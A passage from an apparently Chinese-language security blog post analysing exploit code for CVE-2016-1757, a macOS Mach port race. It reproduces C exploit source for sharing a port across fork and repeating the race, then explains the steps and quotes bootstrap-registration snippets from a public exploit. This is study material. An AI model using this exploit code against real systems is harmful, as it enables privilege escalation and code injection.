class="line"></span><br><span class="line"><span class="comment">// the shared port right in the parent</span></span><br><span class="line"><span class="keyword">mach_port_t</span> shared_port_parent = MACH_PORT_NULL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_shared_port</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line">  <span class="comment">// get a send right to the port we're going to overwrite so that we can both</span></span><br><span class="line">  <span class="comment">// restore it for ourselves and send it to our child</span></span><br><span class="line">  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &amp;saved_special_port);</span><br><span class="line">  MACH_ERR(<span class="string">"saving original special port value"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate the shared port we want our child to have a send right to</span></span><br><span class="line">  err = mach_port_allocate(mach_task_self(),</span><br><span class="line">                           MACH_PORT_RIGHT_RECEIVE,</span><br><span class="line">                           &amp;shared_port_parent);</span><br><span class="line"></span><br><span class="line">  MACH_ERR(<span class="string">"allocating shared port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// insert the send right</span></span><br><span class="line">  err = mach_port_insert_right(mach_task_self(),</span><br><span class="line">                               shared_port_parent,</span><br><span class="line">                               shared_port_parent,</span><br><span class="line">                               MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line">  MACH_ERR(<span class="string">"inserting MAKE_SEND into shared port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);</span><br><span class="line">  MACH_ERR(<span class="string">"setting special port"</span>, err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> recover_shared_port_child() &#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// grab the shared port which our parent stashed somewhere in the special ports</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> shared_port_child = MACH_PORT_NULL;</span><br><span class="line">  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &amp;shared_port_child);</span><br><span class="line">  MACH_ERR(<span class="string">"child getting stashed port"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"child got stashed port"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// say hello to our parent and send a reply port so it can send us back the special port to restore</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate a reply port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> reply_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</span><br><span class="line">  MACH_ERR(<span class="string">"child allocating reply port"</span>, err); </span><br><span class="line"></span><br><span class="line">  <span class="comment">// send the reply port in a hello message</span></span><br><span class="line">  <span class="keyword">simple_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">  msg.header.msgh_local_port = reply_port;</span><br><span class="line">  msg.header.msgh_remote_port = shared_port_child;</span><br><span class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;msg.header);</span><br><span class="line">  MACH_ERR(<span class="string">"child sending task port message"</span>, err);</span><br><span class="line"> </span><br><span class="line">  LOG(<span class="string">"child sent hello message to parent over shared port"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a message on the reply port containing the stolen port to restore</span></span><br><span class="line">  <span class="keyword">port_msg_rcv_t</span> stolen_port_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;stolen_port_msg.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line">  MACH_ERR(<span class="string">"child receiving stolen port\n"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// extract the port right from the message</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> stolen_port_to_restore = stolen_port_msg.port.name;</span><br><span class="line">  <span class="keyword">if</span> (stolen_port_to_restore == MACH_PORT_NULL) &#123;</span><br><span class="line">    FAIL(<span class="string">"child received invalid stolen port to restore"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the special port for the child</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);</span><br><span class="line">  MACH_ERR(<span class="string">"child restoring special port"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"child restored stolen port"</span>);</span><br><span class="line">  <span class="keyword">return</span> shared_port_child;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> recover_shared_port_parent() &#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the special port for ourselves</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);</span><br><span class="line">  MACH_ERR(<span class="string">"parent restoring special port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a message from the child on the shared port</span></span><br><span class="line">  <span class="keyword">simple_msg_rcv_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;msg.header,</span><br><span class="line">                 MACH_RCV_MSG,</span><br><span class="line">                 <span class="number">0</span>,</span><br><span class="line">                 <span class="keyword">sizeof</span>(msg),</span><br><span class="line">                 shared_port_parent,</span><br><span class="line">                 MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                 MACH_PORT_NULL);</span><br><span class="line">  MACH_ERR(<span class="string">"parent receiving child hello message"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"parent received hello message from child"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// send the special port to our child over the hello message's reply port</span></span><br><span class="line">  <span class="keyword">port_msg_send_t</span> special_port_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  special_port_msg.header.msgh_size        = <span class="keyword">sizeof</span>(special_port_msg);</span><br><span class="line">  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;</span><br><span class="line">  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;</span><br><span class="line">  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), <span class="number">0</span>) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line"></span><br><span class="line">  special_port_msg.body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  special_port_msg.port.name        = saved_special_port;</span><br><span class="line">  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;special_port_msg.header);</span><br><span class="line">  MACH_ERR(<span class="string">"parent sending special port back to child"</span>, err);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> shared_port_parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  parse_args(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check that the original is actually a 64-bit mach-o and not a fat binary</span></span><br><span class="line">  verify_original(original, original_length);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// apply the patch to the original</span></span><br><span class="line">  apply_patch(original, original_length, patch, patch_length);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> tries = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    setup_shared_port();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (child_pid == -<span class="number">1</span>) &#123;</span><br><span class="line">      FAIL(<span class="string">"forking"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">mach_port_t</span> shared_port_child = recover_shared_port_child();</span><br><span class="line">      do_child(shared_port_child);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">mach_port_t</span> shared_port_parent = recover_shared_port_parent();</span><br><span class="line">      do_parent(shared_port_parent);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> status;</span><br><span class="line">      wait(&amp;status);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</span><br><span class="line">        LOG(<span class="string">"worked :-)"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      tries++;</span><br><span class="line">      <span class="keyword">if</span> (tries &gt; max_tries) &#123;</span><br><span class="line">        FAIL(<span class="string">"either didn't win the race (try again) or we won but the child didn't exit cleanly with a 0 return code"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      LOG(<span class="string">"trying again..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过一个<code>saved_special_port</code>完成了，父进程与子进程之间的<code>port</code>传递，从而使得父进程与子进程共享同一个<code>port</code>，子进程再通过共享的<code>port</code>，将自身的<code>task</code>的<code>port</code>发送给父进程并最终在父进程中实现对子进程代码段修改，执行任意代码，详情见<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">这里</a>。</p>
<h3 id="2-2_解析">2.2 解析</h3><ol>
<li>父进程通过<code>task_get_special_port</code>获取他的<code>special ports</code>，并存储在局部变量中。<code>special ports</code>是一些连接着系统服务的<code>port</code>，在<code>fork</code>的过程中，子进程会继承<code>special port</code>。</li>
<li>父进程通过<code>mach_port_allocate</code>函数创建一个新的<code>port</code>，通过<code>task_set_special_port</code>将这个新的<code>port</code>设为<code>special port</code>，且通过<code>mach_port_insert_right</code>为这个新的<code>port</code>赋予写的权限。并最终试图将这个新的<code>port</code>传递给子进程。</li>
<li>父进程进行<code>fork</code>，子进程继承了<em>[2]</em>中创建的新的<code>port</code>，作为自己的<code>special port</code>。</li>
<li>父进程将保存的在临时变量中的<code>special port</code>，重新设置回来。</li>
<li>子进程获取这个替换过的<code>special port</code>，并且保存下来。</li>
<li>子进程通过继承的<code>special port</code>和父进程通信。</li>
<li>父进程在收到子进程的消息后，将当前的<code>special port</code>再发送给子进程。</li>
<li>子进程也将收到的<code>special port</code>设置为自己的<code>special port</code>。</li>
</ol>
<p>时序图大致如下：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/port_dance.png" alt="port dance"></p>
<p>通过上面的分析，可以得知，再利用这个漏洞的时候，我们想要的就是一个父进程与子进程共同持有，且可以用来交流的<code>port</code>，通过这个<code>port</code>，子进程可以将自己的<code>task port</code>交给另外一个进程，这里是父进程，来实现漏洞的利用。</p>
<h1 id="0x03_server&amp;client">0x03 server&amp;client</h1><p>那么新的<code>EXP</code>使用了什么方法实现的呢？</p>
<h2 id="3-1_bootstrap_register">3.1 bootstrap_register</h2><p>每一个<code>task</code>可以调用<code>bootstrap_register()</code>函数，向<code>bootstrap server</code>注册一个服务，通过一个字符串与自己的<code>task port</code>相关联。其他的<code>task</code>可以通过<code>bootstrap_look_up</code>函数来通过字符串查询对应的<code>task</code>的<code>port</code>。</p>
<p>那么问题就一目了然了。</p>
<ul>
<li>建了一个进程A，通过<code>bootstrap_register</code>注册一个服务。</li>
<li>建立一个进程B，通过<code>bootstrap_look_up</code>获取进程A的<code>task port</code>。</li>
<li>进程B通过进程A的<code>task port</code>将自己的<code>task port</code>告知进程A。</li>
<li>进程A通过进程B的<code>task port</code>配合进程B，出发漏洞。</li>
</ul>
<p>​    </p>
<h2 id="3-2_bootstrap_register2">3.2 bootstrap_register2</h2><p>这个方案虽然简单明了，但是缺有一个问题，<code>bootstrap_register</code>在10.5之后的版本就没有了。</p>
<p>不过网上有个一简单的替代方法，在-[NSMachBootstrapServer registerPort:name:]中封装了一个<code>bootstrap_register2</code>，只不过并没有导出到外部，所以只需要添加一行代码就可以使用<code>bootstrap_register2</code>来完成相应的功能。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span><br><span class="line"> * this is not exported so we need to declare it</span><br><span class="line"> * we need to use this because bootstrap_create_server is broken in Yosemite</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> kern_return_t <span class="title">bootstrap_register2</span><span class="params">(mach_port_t bp, name_t service_name, mach_port_t sp, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<h2 id="3-3_实际代码">3.3 实际代码</h2><p>摘取利用代码中相关代码段。</p>
<p>mach_server.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* register the server with launchd */</span></span><br><span class="line">kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;server_port);</span><br><span class="line">   </span><br><span class="line">kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">kr = bootstrap_register2(bootstrap_port, SERVICE_NAME, server_port, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* alternative method to register with launchd */</span></span><br></pre></td></tr></table></figure>
<p>mach_client.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DEBUG_MSG(<span class="string">"Looking up server..."</span>);</span><br><span class="line">kr = bootstrap_look_up(bootstrap_port, SERVICE_NAME, &amp;server_port);</span><br><span class="line">EXIT_ON_MACH_ERROR(<span class="string">"bootstrap_look_up"</span>, kr, BOOTSTRAP_SUCCESS);</span><br><span class="line"></span><br><span class="line">kr = mach_port_allocate(mach_task_self(),        <span class="comment">// our task is acquiring</span></span><br><span class="line">                        MACH_PORT_RIGHT_RECEIVE, <span class="comment">// a new receive right</span></span><br><span class="line">                        &amp;client_port);           <span class="comment">// with this name</span></span><br></pre></td></tr></table></figure>
<h1 id="0x04_小结">0x04 小结</h1><p>有兴趣的读者可以仔细阅读<a href="https://github.com/gdbinit/mach_race" target="_blank" rel="external">fG!的利用</a>，与之前的利用代码的不同之处并不止在<code>mach message</code>的利用这一点上。以后有时间还会做出更细致的分析。</p>
<h1 id="引用">引用</h1><p>1.Inter-Process Communication</p>
<p><a href="http://nshipster.com/inter-process-communication/" target="_blank" rel="external">http://nshipster.com/inter-process-communication/</a></p>
<p>2.Debugging Mach Ports</p>
<p><a href="https://robert.sesek.com/2012/1/debugging_mach_ports.html" target="_blank" rel="external">https://robert.sesek.com/2012/1/debugging_mach_ports.html</a></p>
<p>3.Changes to XNU Mach IPC</p>
<p><a href="https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html" target="_blank" rel="external">https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html</a></p>
<p>4.A Little IPC Project</p>
<p><a href="http://www.nongnu.org/hurdextras/ipc_guide/mach_ipc_basic_concepts.html" target="_blank" rel="external">http://www.nongnu.org/hurdextras/ipc_guide/mach_ipc_basic_concepts.html</a></p>
<p>5.深入理解RunLoop</p>
<p><a href="http://blog.ibireme.com/2015/05/18/runloop/" target="_blank" rel="external">http://blog.ibireme.com/2015/05/18/runloop/</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2016/07/05/再看CVE-2016-1757浅析mach message的使用/">再看CVE-2016-1757---浅析mach message的使用</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 mrh 的个人博客">mrh</a></p>
        <p><span>发布时间:</span>2016年07月05日 - 20时55分</p>
        <p><span>最后更新:</span>2016年07月06日 - 02时16分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2016/07/05/再看CVE-2016-1757浅析mach message的使用/" title="再看CVE-2016-1757---浅析mach message的使用">http://turingh.github.io/2016/07/05/再看CVE-2016-1757浅析mach message的使用/</a>
            <span class="copy-path" data-clipboard-text="原文: http://turingh.github.io/2016/07/05/再看CVE-2016-1757浅析mach message的使用/　　作者: mrh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2016/09/07/CVE-2016-4656分析与调试/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          CVE-2016-4656分析与调试
        
      </div>
    </a>
  
  
    <a href="/2016/06/28/libmalloc源码分析之nanozone-s的处理/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">libmalloc源码分析之nanozone_s的处理</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00_摘要"><span class="toc-number">1.</span> <span class="toc-text">0x00 摘要</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01_Mach"><span class="toc-number">2.</span> <span class="toc-text">0x01 Mach</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1_Mach_Messages"><span class="toc-number">2.1.</span> <span class="toc-text">1.1 Mach Messages</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1_Simple_Message"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.1.1 Simple Message</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2_Complex_Messages"><span class="toc-number">2.1.2.</span> <span class="toc-text">1.1.2 Complex Messages</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2_ports"><span class="toc-number">2.2.</span> <span class="toc-text">1.2 ports</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1_port_的权限"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.2.1 port 的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2_一些特殊的port"><span class="toc-number">2.2.2.</span> <span class="toc-text">1.2.2 一些特殊的port</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3_Send&Recv_Messages"><span class="toc-number">2.3.</span> <span class="toc-text">1.3 Send&Recv Messages</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02_The_Port_Swap_Dance"><span class="toc-number">2.4.</span> <span class="toc-text">0x02 The Port Swap Dance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1_源码"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.1 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2_解析"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.2 解析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03_server&client"><span class="toc-number">3.</span> <span class="toc-text">0x03 server&client</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1_bootstrap_register"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 bootstrap_register</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2_bootstrap_register2"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 bootstrap_register2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3_实际代码"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 实际代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04_小结"><span class="toc-number">4.</span> <span class="toc-text">0x04 小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#引用"><span class="toc-number">5.</span> <span class="toc-text">引用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PS"><span class="toc-number">6.</span> <span class="toc-text">PS</span></a></li></ol>
</div>
<style>
    .left-col .switch-btn {
        display: none;
    }
    .left-col .switch-area {
        display: none;
    }
</style>

<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }

    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
            $(".switch-btn, .switch-area").fadeOut(300);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
            $(".switch-btn, .switch-area").fadeIn(500);
        }
    })

    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
        $(".switch-btn, .switch-area").show();
    }
</script>







    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2016/09/07/CVE-2016-4656分析与调试/" title="上一篇: CVE-2016-4656分析与调试">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2016/06/28/libmalloc源码分析之nanozone-s的处理/" title="下一篇: libmalloc源码分析之nanozone_s的处理">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/11/07/CVE-2016-4669分析与调试/">CVE-2016-4669分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/task-t-considered-harmfull-analysis-P1/">XNU内核中task_t相关漏洞分析笔记(Part I)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/07/CVE-2016-4656分析与调试/">CVE-2016-4656分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/05/再看CVE-2016-1757浅析mach message的使用/">再看CVE-2016-1757---浅析mach message的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/28/libmalloc源码分析之nanozone-s的处理/">libmalloc源码分析之nanozone_s的处理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/28/libmalloc源码分析之初始化/">libmalloc源码分析之初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/24/nlist-Mach-O文件重定向信息数据结构分析/">nlist-Mach-O文件重定向信息数据结构分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/23/10-11-4版本小结/">10-11-4版本小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/29/CVE-2016-1749内核代码执行POC分析/">CVE-2016-1749内核代码执行POC分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/19/CVE-2016-1757利用程序分析/">CVE-2016-1757利用程序分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/18/apple沙盒研究之基础知识/">apple沙盒研究之基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/13/利用patch绕过kextload对内核签名的检测/">利用patch绕过kextload对内核签名的检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/03/CVE-2016-1757简单分析/">CVE-2016-1757简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/OSX内核加载mach-o流程分析/">OSX内核加载mach-o流程分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/fishhook源码分析/">fishhook源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/16/dyld源码分析load/">dyld源码分析-动态加载load</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/10/Mach-O的动态链接/">Mach-O的动态链接相关知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/mach-o文件格式分析/">mach-o格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/03/CVE-2016-0799简单分析/">CVE-2016-0799简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/dyld中macho加载的简单分析/">dyld中mach-o文件加载的简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/OS-X-内核研究-基础知识/">OS X 内核研究 准备知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/23/通过fusion level02浅谈exploit中的函数调用伪造/">通过fusion level02浅谈exploit中的函数调用伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/19/CVE-2015-7547分析与调试副本/">对CVE-2015-7547简单的分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/19/CVE-2015-7547分析与调试/">对CVE-2015-7547简单的分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/09/CVE-2016-1879调试&分析/">CVE-2016-1879 调试&分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/01/27/frame-faking/">frame-faking-介绍-函数调用伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/14/protostar-heap3/">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/12/图解DWORDSHOOT/">图解DWORDSHOOT</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/09/protostar-heap2/">protostar详细解析 heap2 解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/09/protostar-heap1/">protostar详细解析 heap1 解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/04/栈溢出练习小结/">wargame简单入门</a></li></ul>
    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#toc, .switch-btn, .switch-area").toggle();
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
                $(".switch-btn, .switch-area").fadeToggle(300);
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2016 mrh
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >本站到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="/js/main.js" type="text/javascript"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 21;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-71141416-1', 'auto');
ga('send', 'pageview');

</script>
